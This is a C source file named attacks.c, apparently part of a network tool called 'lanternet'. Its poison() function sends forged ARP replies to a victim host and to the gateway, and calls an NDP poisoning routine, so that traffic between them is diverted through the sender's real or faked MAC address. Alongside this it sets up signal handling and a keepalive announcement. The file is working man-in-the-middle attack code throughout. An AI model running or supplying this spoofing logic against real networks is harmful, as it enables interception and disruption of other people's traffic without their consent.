/* attacks.c - the poison primitives */
#include "lanternet.h"

volatile sig_atomic_t g_stop = 0;
int g_loop_active = 0;                /* set by the server loop */

/* In a loop a signal means "stop". Anywhere else there is nothing of ours to
   undo, so fall through to the default action. */
static void on_signal(int sig){
    if(g_loop_active){ g_stop = 1; return; }
    signal(sig,SIG_DFL);
    raise(sig);
}

void install_signals(void){
    struct sigaction sa; memset(&sa,0,sizeof sa);
    sa.sa_handler = on_signal;          /* just sets a flag; the loop polls it */
    sigemptyset(&sa.sa_mask);
    sigaction(SIGTERM,&sa,NULL);
    sigaction(SIGINT, &sa,NULL);
    sigaction(SIGHUP, &sa,NULL);
    signal(SIGPIPE,SIG_IGN);
}

void poison(const struct host *h){
    static const unsigned char zero[6]={0,0,0,0,0,0};
    const unsigned char *sender = g_use_fake ? g_fake_mac : g_mymac;
    if(g_do_v4){
        send_arp(1, h->mac, g_gwip, sender, h->ip, zero);    /* victim: gateway is at <sender> */
        send_arp(1, g_gwmac, h->ip, sender, g_gwip, zero);   /* gateway: victim is at <sender> */
    }
    ndp_poison(h);
}

void self_keepalive(void){
    static const unsigned char zero[6]={0,0,0,0,0,0};
    if((g_gwmac[0]||g_gwmac[1]) && g_do_v4) send_arp(1, g_gwmac, g_myip, g_mymac, g_gwip, zero);
}
